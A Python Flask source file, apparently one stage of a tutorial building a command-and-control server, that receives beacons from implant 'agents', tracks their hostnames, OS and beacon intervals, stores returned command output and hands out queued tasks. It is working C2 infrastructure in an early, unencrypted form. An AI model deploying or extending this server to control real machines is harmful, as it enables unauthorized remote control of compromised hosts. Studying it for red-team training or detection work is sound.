"""
SERVER — Stage 05 (Jitter Awareness)

Matches: agent/stages/stage05_with jitter.go

What this adds:
- Tracks beacon intervals per agent
- Detects if agent is beaconing too fast or too slow
- Still plain JSON (no encryption yet)
"""

from flask import Flask, request, jsonify
from datetime import datetime
import time

app = Flask(__name__)

agents       = {}
tasks        = {}
results      = {}
last_seen_ts = {}   # agent_id -> unix timestamp of last beacon

@app.route("/beacon", methods=["POST"])
def beacon():
    data     = request.get_json()
    agent_id = data.get("agent", "unknown")
    now      = time.time()

    # Detect beacon interval
    if agent_id in last_seen_ts:
        interval = now - last_seen_ts[agent_id]
        print(f"[+] Beacon from {agent_id} | interval: {interval:.1f}s")
    else:
        print(f"[+] First beacon from {agent_id}")

    last_seen_ts[agent_id] = now

    agents[agent_id] = {
        "hostname":  data.get("hostname", "?"),
        "os":        data.get("os", "?"),
        "status":    data.get("status", "unknown"),
        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

    if data.get("output"):
        results[agent_id] = data["output"]
        print(f"\n[OUTPUT from {agent_id}]\n{data['output']}\n{'='*40}")

    task = tasks.pop(agent_id, None)
    return jsonify({"task": task or ""})

if __name__ == "__main__":
    print("[*] Stage 05 server started on http://127.0.0.1:8080")
    app.run(host="0.0.0.0", port=8080, debug=False)
